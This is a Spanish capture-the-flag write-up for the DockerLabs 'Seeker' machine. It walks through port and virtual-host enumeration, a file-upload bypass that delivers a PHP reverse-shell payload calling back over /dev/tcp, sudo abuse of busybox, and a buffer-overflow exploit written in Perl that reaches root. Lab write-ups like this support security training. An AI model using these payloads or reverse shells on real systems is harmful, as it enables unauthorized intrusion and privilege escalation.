#MAQUINA #DOCKERLABS #MEDIO 
#SUBDOMAINS #ABUSO_SUBIDA_ARCHIVOS 
#BUFFER_OVERFLOW

<hr>

# RECONOCIMIENTO

Vamos a resolver **Seeker** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 15:48 CET
Initiating ARP Ping Scan at 15:48
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:48, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:48
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:48, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-20 15:48:24 CET for 0s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)




```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 15:49 CET
Nmap scan report for cinema.dl (172.17.0.2)
Host is up (0.000019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.46 seconds




```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 15:49 CET
Nmap scan report for cinema.dl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds


                                                            


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.


## HTTP (80)

No parece haber mucho, pero encuentro lo siguiente:

```bash
This is the default welcome page used to test the correct operation of the Apache2 server after installation on Debian systems. If you can read this page, it means that the Apache HTTP server installed at this site is working properly. You should **replace this file** (located at /var/www/5eEk3r/index.html) before continuing to operate your HTTP server.
```

Meto 5eEk3r.dl (dockerlabs) en el /etc/hosts y bingo.
Usamos gobuster para enumerar y no parece haber nada.

Vamos a ver si hay subdominios :
```bash
gobuster vhost -u 5eEk3r.dl -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 --append-domain 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://5eEk3r.dl
[+] Method:          GET
[+] Threads:         20
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: crosswords.5eEk3r.dl Status: 200 [Size: 934]
Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

Lo metemos al /etc/hosts.

```bash
gobuster vhost -u crosswords.5eEk3r.dl -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://crosswords.5eEk3r.dl
[+] Method:          GET
[+] Threads:         20
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.crosswords.5eEk3r.dl Status: 200 [Size: 2906]
Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================

```

Lo metemos también.

# EXPLOTACION

Con **burpsuite** interceptamos el envío de un php nuestro y le cambiamos la extensión a phar: 

   ```bash

POST / HTTP/1.1
Host: admin.crosswords.5eek3r.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------85739557222247238831808751400
Content-Length: 476
Origin: http://admin.crosswords.5eek3r.dl
Connection: keep-alive
Referer: http://admin.crosswords.5eek3r.dl/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------85739557222247238831808751400
Content-Disposition: form-data; name="upload"; filename="wp.phar"
Content-Type: application/x-php

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

-----------------------------85739557222247238831808751400--



```

Mientras nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**)

YA ESTAMOS COMO WWW-DATA.
# ESCALADA PRIVILEGIOS

Vamos a ver si tenemos permisos SUDO:

```bash
www-data@dockerlabs:/var/www/crosswords/web$ sudo -l
Matching Defaults entries for www-data on dockerlabs:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on dockerlabs:
    (astu : astu) NOPASSWD: /usr/bin/busybox


```

```bash
www-data@dockerlabs:/var/www/crosswords/web$ sudo -u astu busybox sh
```

YA ESTAMOS COMO ASTU.

Vemos un binario:
```bash
astu@dockerlabs:~/secure$ ./bs64 
Ingrese el texto: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQQ==
Segmentation fault

```

**Buffer Overflow**

```bash
checksec --file=vulnerable

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   32 Symbols        No    0               1               vulnerable

astu@dockerlabs:~/secure$ cat /proc/sys/kernel/randomize_va_space
2

```

La pila no es ejecutable y hay ASLR. Ademas, depurando el binario con gdb:

```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  putchar@plt
0x0000000000401040  system@plt
0x0000000000401050  printf@plt
0x0000000000401060  getchar@plt
0x0000000000401070  setuid@plt
0x0000000000401080  _start
0x00000000004010b0  _dl_relocate_static_pie
0x0000000000401166  to_base64
0x0000000000401315  my_gets
0x000000000040136a  fire
0x000000000040139e  main
0x00000000004013dc  _fini
pwndbg> disassemble fire
Dump of assembler code for function fire:
   0x000000000040136a <+0>:     push   rbp
   0x000000000040136b <+1>:     mov    rbp,rsp
   0x000000000040136e <+4>:     lea    rax,[rip+0xcfb]        # 0x402070
   0x0000000000401375 <+11>:    mov    rdi,rax
   0x0000000000401378 <+14>:    mov    eax,0x0
   0x000000000040137d <+19>:    call   0x401050 <printf@plt>
   0x0000000000401382 <+24>:    mov    edi,0x0
   0x0000000000401387 <+29>:    call   0x401070 <setuid@plt>
   0x000000000040138c <+34>:    lea    rax,[rip+0xcf0]        # 0x402083
   0x0000000000401393 <+41>:    mov    rdi,rax
   0x0000000000401396 <+44>:    call   0x401040 <system@plt>
   0x000000000040139b <+49>:    nop
   0x000000000040139c <+50>:    pop    rbp
   0x000000000040139d <+51>:    ret
End of assembler dump.
```

Tiene una funcion **fire** interesante de la que nos vamos a aprovechar ya que setea el suid y después llama a system.

 Vamos a crear un patrón para ver cuando sobreescribimos el RIP
 
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

Cogemos el valor de RBP en del gdb y vemos:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x3363413263413163
[*] Exact match at offset 64

```

Por lo que ahora mismo necesitamos 64 A y 8 B(sobreescribir el RBP, ya que luego ya es el RIP).

Vemos la dirección a llamar a fire:

```bash
pwndbg> xinfo fire
Extended information for virtual address 0x40136a:

  Containing mapping:
          0x401000           0x402000 r-xp     1000   1000 /home/victor/Desktop/vulnerable

  Offset information:
         Mapped Area 0x40136a = 0x401000 + 0x36a
         File (Base) 0x40136a = 0x400000 + 0x136a
      File (Segment) 0x40136a = 0x401000 + 0x36a
         File (Disk) 0x40136a = /home/victor/Desktop/vulnerable + 0x136a

 Containing ELF sections:
               .text 0x40136a = 0x401080 + 0x2ea

pwndbg> disassemble fire
Dump of assembler code for function fire:
   0x000000000040136a <+0>:     push   rbp
   0x000000000040136b <+1>:     mov    rbp,rsp
   0x000000000040136e <+4>:     lea    rax,[rip+0xcfb]        # 0x402070
   0x0000000000401375 <+11>:    mov    rdi,rax
   0x0000000000401378 <+14>:    mov    eax,0x0
   0x000000000040137d <+19>:    call   0x401050 <printf@plt>
   0x0000000000401382 <+24>:    mov    edi,0x0
   0x0000000000401387 <+29>:    call   0x401070 <setuid@plt>
   0x000000000040138c <+34>:    lea    rax,[rip+0xcf0]        # 0x402083
   0x0000000000401393 <+41>:    mov    rdi,rax
   0x0000000000401396 <+44>:    call   0x401040 <system@plt>
   0x000000000040139b <+49>:    nop
   0x000000000040139c <+50>:    pop    rbp
   0x000000000040139d <+51>:    ret
End of assembler dump.
```

La dir es `0x40136a`, pero para arrreglar el alineamiento de la pila o bien metemos una instrucción ret antes o apuntamos a `0x40136b` para evitar este problema.

```python

astu@dockerlabs:~$ cat script.pl 
#!/usr/bin/perl

$|=1;


$payload = "A" x 64;
$payload .= "B" x 8;
$payload .= pack("Q",0x40136b);

print $payload;
astu@dockerlabs:~$ (./script.pl; cat) | secure/bs64 
x
Ingrese el texto: QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUJQkJQkJaxN
id
uid=0(root) gid=1000(astu) groups=1000(astu),100(users)
whoami
root

```

Otra opción del script (instr. ret):

```
#!/usr/bin/perl

$|=1;


$payload = "A" x 64;
$payload .= "B" x 8;
$payload .= pack("Q",0x0040101a);
$payload .= pack("Q",0x000000000040136a);

print $payload;

```

**YA ESTAMOS COMO ROOT**